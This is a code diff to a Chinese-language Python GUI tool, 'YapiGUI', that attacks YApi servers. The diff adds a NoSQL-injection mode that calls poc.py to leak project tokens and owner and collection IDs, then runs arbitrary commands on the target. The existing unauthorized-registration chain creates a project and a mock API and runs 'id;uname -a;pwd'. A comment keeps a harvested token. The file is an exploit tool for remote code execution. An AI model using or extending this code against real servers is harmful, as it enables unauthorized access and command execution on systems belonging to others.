@@ -1,9 +1,14 @@
+#/usr/local/bin/python3.9
 import tkinter as tk
 from tkinter import ttk
 from tkinter import filedialog
 import string
 import random
 import requests
+import subprocess
+
+python_global_path = "/usr/local/bin/python3.9"
+
 REGISTER_API = "/api/user/reg"
 LOGIN_API = "/api/user/login"
 ADD_PROJECT_API = "/api/project/add"
@@ -151,6 +156,28 @@ class YapiGUI:
         
         self.path_name_entry = tk.Entry(row3_frame, width=20)
         self.path_name_entry.pack(side=tk.LEFT, padx=5)
+        # 第四行：注入类型
+        row4_frame = tk.Frame(middle_frame)
+        row4_frame.pack(fill=tk.X, pady=5)
+        # ID标签和文本框
+        # hit: project_id: 66 | owner_id: 11 | col_id: 66 | token: 1cae15606ea4b223b01a
+        owner_id_label = tk.Label(row4_frame, text="owner_id:")
+        owner_id_label.pack(side=tk.LEFT, padx=5)
+        
+        self.owner_id_entry = tk.Entry(row4_frame, width=20)
+        self.owner_id_entry.pack(side=tk.LEFT, padx=5)
+        
+        col_id_label = tk.Label(row4_frame, text="col_id:")
+        col_id_label.pack(side=tk.LEFT, padx=5)
+        
+        self.col_id_entry = tk.Entry(row4_frame, width=20)
+        self.col_id_entry.pack(side=tk.LEFT, padx=5)
+        
+        token_label = tk.Label(row4_frame, text="token:")
+        token_label.pack(side=tk.LEFT, padx=5)
+        
+        self.token_entry = tk.Entry(row4_frame, width=20)
+        self.token_entry.pack(side=tk.LEFT, padx=5)
 
     
     def create_bottom_section(self):
@@ -262,7 +289,23 @@ class YapiGUI:
             
             self.mock_api(target_url,project_id, api_id,path_name,headers,cmd)
         elif exploit_type == "nosql注入":
-            pass
+            try:
+                target_url = self.url_entry.get()
+                if not target_url:
+                    self.result_text.insert(tk.END, "错误: 请输入目标URL\n")
+                    return
+                # 构建命令
+                commad = f"{python_global_path} poc.py rce -u {target_url} -t {self.token_entry.get()} -o {self.owner_id_entry.get()} --pid {self.project_id_entry.get()} --cid {self.col_id_entry.get()} --command=\"{cmd}\""
+                # print(commad)
+                # 执行命令并捕获输出
+                result = subprocess.run(commad, shell=True, capture_output=True, text=True)
+                # 将结果输出到文本框
+                if result.stdout:
+                    self.result_text.insert(tk.END, f"返回信息:\n{result.stdout}\n")
+                if result.stderr:
+                    self.result_text.insert(tk.END, f"错误信息:\n{result.stderr}\n")
+            except Exception as e:
+                self.result_text.insert(tk.END, f"执行命令时出错: {str(e)}\n")
         else:
             self.result_text.insert(tk.END, "请选择有效的漏洞类型\n")
 
@@ -318,75 +361,84 @@ class YapiGUI:
                 response = requests.post(target_url+REGISTER_API, json=data)
                 # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
                 # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
-                # self.result_text.insert(tk.END, f"获取到的Cookie: {response.cookies.get_dict()}\n")
-                # 清空Cookie多行文本框（注意：Text组件使用1.0作为起始索引）
-                self.cookie_entry.delete(1.0, tk.END)
-                # 将Cookie字典转换为标准格式（key=value; key=value）
-                cookie_dict = response.cookies.get_dict()
-                cookie_str = '; '.join([f"{key}={value}" for key, value in cookie_dict.items()])
-                self.cookie_entry.insert(tk.END, cookie_str)
-                self.result_text.insert(tk.END, f"注册成功，用户名：{username}，邮箱：{email}，密码：{password}\n")
-                headers = {
-                    "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
-                }
-                response = requests.get(target_url+GET_MYGROUP_ID, headers=headers)
-                # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
-                # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
-                group_id = response.json()['data']['_id']
-                # self.result_text.insert(tk.END, f"获取到的GroupID: {group_id}\n")
-                # # 将GroupID作为新的cookie条目添加到cookie_entry中
-                # self.cookie_entry.insert(tk.END, f"; _id={group_id}")
-                # headers = {
-                #     "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
-                # }
-                project_name = generate_random_string(6)
-                data = {
-                    "name":project_name,
-                    "group_id":str(group_id),
-                    "icon":"code-o",
-                    "color":"purple",
-                    "project_type":"private"
-                }
-                response = requests.post(target_url+ADD_PROJECT_API, headers=headers, json=data)
-                print(headers,data)
-                # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
-                # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
-                # self.result_text.insert(tk.END, f"创建项目成功：{project_name}\n")
-                project_id = response.json()['data']['_id']
-                # self.result_text.insert(tk.END, f"获取到的ProjectID: {project_id}\n")
-                response = requests.get(target_url+PROJECT_GET_API+str(project_id), headers=headers)
-                # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
-                # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
-                cat_id = response.json()['data']['cat'][0]['_id']
-                # self.result_text.insert(tk.END, f"获取到的CatID: {cat_id}\n")
-                title_name = generate_random_string(6)
-                path_name = generate_random_string(6)
-                data = {
-                    "project_id":project_id,
-                    "catid":cat_id,
-                    "title":title_name,
-                    "path":"/"+path_name,
-                    "method":"GET"
+                errcode = response.json()['errcode']
+                print(errcode)
+                print(type(errcode))
+                if errcode == 400:
+                    self.result_text.insert(tk.END, f"注册失败，错误码：{errcode}，错误信息：{response.json()['errmsg']}\n")
+                    self.result_text.insert(tk.END, f"不存在未授权注册漏洞！\n")
+                    return
+                else:
+                    
+                    # self.result_text.insert(tk.END, f"获取到的Cookie: {response.cookies.get_dict()}\n")
+                    # 清空Cookie多行文本框（注意：Text组件使用1.0作为起始索引）
+                    self.cookie_entry.delete(1.0, tk.END)
+                    # 将Cookie字典转换为标准格式（key=value; key=value）
+                    cookie_dict = response.cookies.get_dict()
+                    cookie_str = '; '.join([f"{key}={value}" for key, value in cookie_dict.items()])
+                    self.cookie_entry.insert(tk.END, cookie_str)
+                    self.result_text.insert(tk.END, f"注册成功，用户名：{username}，邮箱：{email}，密码：{password}\n")
+                    headers = {
+                        "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
+                    }
+                    response = requests.get(target_url+GET_MYGROUP_ID, headers=headers)
+                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
+                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
+                    group_id = response.json()['data']['_id']
+                    # self.result_text.insert(tk.END, f"获取到的GroupID: {group_id}\n")
+                    # # 将GroupID作为新的cookie条目添加到cookie_entry中
+                    # self.cookie_entry.insert(tk.END, f"; _id={group_id}")
+                    # headers = {
+                    #     "Cookie": self.cookie_entry.get(1.0, tk.END).strip()
+                    # }
+                    project_name = generate_random_string(6)
+                    data = {
+                        "name":project_name,
+                        "group_id":str(group_id),
+                        "icon":"code-o",
+                        "color":"purple",
+                        "project_type":"private"
+                    }
+                    response = requests.post(target_url+ADD_PROJECT_API, headers=headers, json=data)
+                    print(headers,data)
+                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
+                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
+                    # self.result_text.insert(tk.END, f"创建项目成功：{project_name}\n")
+                    project_id = response.json()['data']['_id']
+                    # self.result_text.insert(tk.END, f"获取到的ProjectID: {project_id}\n")
+                    response = requests.get(target_url+PROJECT_GET_API+str(project_id), headers=headers)
+                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
+                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
+                    cat_id = response.json()['data']['cat'][0]['_id']
+                    # self.result_text.insert(tk.END, f"获取到的CatID: {cat_id}\n")
+                    title_name = generate_random_string(6)
+                    path_name = generate_random_string(6)
+                    data = {
+                        "project_id":project_id,
+                        "catid":cat_id,
+                        "title":title_name,
+                        "path":"/"+path_name,
+                        "method":"GET"
 
-                }
-                response = requests.post(target_url+ADD_API_API, headers=headers, json=data)
-                # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
-                # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
-                # self.result_text.insert(tk.END, f"创建接口成功：{title_name}\n")
-                api_id = response.json()['data']['_id']
-                # self.result_text.insert(tk.END, f"获取到的APIID: {api_id}\n")
-                # self.result_text.insert(tk.END, f"获取到的接口标题: {title_name}\n")
-                # self.result_text.insert(tk.END, f"获取到的接口路径: {path_name}\n")
-                # self.result_text.insert(tk.END, f"获取到的接口方法: {data['method']}\n")
-                self.project_id_entry.insert(tk.END, project_id)
-                self.api_id_entry.insert(tk.END, api_id)
-                self.path_name_entry.insert(tk.END, path_name)
-                target_url=target_url
-                project_id=project_id
-                api_id=api_id
-                path_name=path_name
-                headers=headers
-                self.mock_api(target_url,project_id, api_id,path_name,headers,"id;uname -a;pwd")
+                    }
+                    response = requests.post(target_url+ADD_API_API, headers=headers, json=data)
+                    # self.result_text.insert(tk.END, f"响应状态码: {response.status_code}\n")
+                    # self.result_text.insert(tk.END, f"响应内容: {response.text}\n")
+                    # self.result_text.insert(tk.END, f"创建接口成功：{title_name}\n")
+                    api_id = response.json()['data']['_id']
+                    # self.result_text.insert(tk.END, f"获取到的APIID: {api_id}\n")
+                    # self.result_text.insert(tk.END, f"获取到的接口标题: {title_name}\n")
+                    # self.result_text.insert(tk.END, f"获取到的接口路径: {path_name}\n")
+                    # self.result_text.insert(tk.END, f"获取到的接口方法: {data['method']}\n")
+                    self.project_id_entry.insert(tk.END, project_id)
+                    self.api_id_entry.insert(tk.END, api_id)
+                    self.path_name_entry.insert(tk.END, path_name)
+                    target_url=target_url
+                    project_id=project_id
+                    api_id=api_id
+                    path_name=path_name
+                    headers=headers
+                    self.mock_api(target_url,project_id, api_id,path_name,headers,"id;uname -a;pwd")
 
 
                 
@@ -396,8 +448,47 @@ class YapiGUI:
             
         elif exploit_type == "nosql注入":
             self.result_text.insert(tk.END, "执行NoSQL注入漏洞利用...\n")
-            self.result_text.insert(tk.END, "注意：此功能尚未完全实现！\n")
-            # 这里可以添加NoSQL注入的实现代码
+            try:
+                target_url = self.url_entry.get()
+                if not target_url:
+                    self.result_text.insert(tk.END, "错误: 请输入目标URL\n")
+                    return
+                # 构建命令
+                cmd = f"{python_global_path} poc.py --debug one4all -u {target_url}"
+
+                # 执行命令并捕获输出
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                if "no new token found, exit..." in result.stdout:
+                    self.result_text.insert(tk.END, f"不存在漏洞\n")
+                    return
+                else:
+                    # 将结果输出到文本框
+                    self.result_text.insert(tk.END, f"命令输出:\n{result.stdout}\n")
+                    # print(result.stdout)
+                    # 提取project_id、owner_id、col_id和token
+                    import re
+                    output = result.stdout
+                    match = re.search(r'hit: project_id: (\d+) \| owner_id: (\d+) \| col_id: (\d+) \| token: ([\w]+)', output)
+                    # print(match)
+                    if match:
+                        project_id = match.group(1)
+                        owner_id = match.group(2)
+                        col_id = match.group(3)
+                        token = match.group(4)
+                        # 填充到对应的文本框
+                        self.project_id_entry.delete(0, tk.END)
+                        self.project_id_entry.insert(0, project_id)
+                        self.owner_id_entry.delete(0, tk.END)
+                        self.owner_id_entry.insert(0, owner_id)
+                        self.col_id_entry.delete(0, tk.END)
+                        self.col_id_entry.insert(0, col_id)
+                        self.token_entry.delete(0, tk.END)
+                        self.token_entry.insert(0, token)
+                    self.result_text.insert(tk.END, f"命令输出:\n{result.stdout}\n")
+                if result.stderr:
+                    self.result_text.insert(tk.END, f"错误信息:\n{result.stderr}\n")
+            except Exception as e:
+                self.result_text.insert(tk.END, f"执行命令时出错: {str(e)}\n")
             
         else:
             self.result_text.insert(tk.END, "请选择有效的漏洞类型\n")
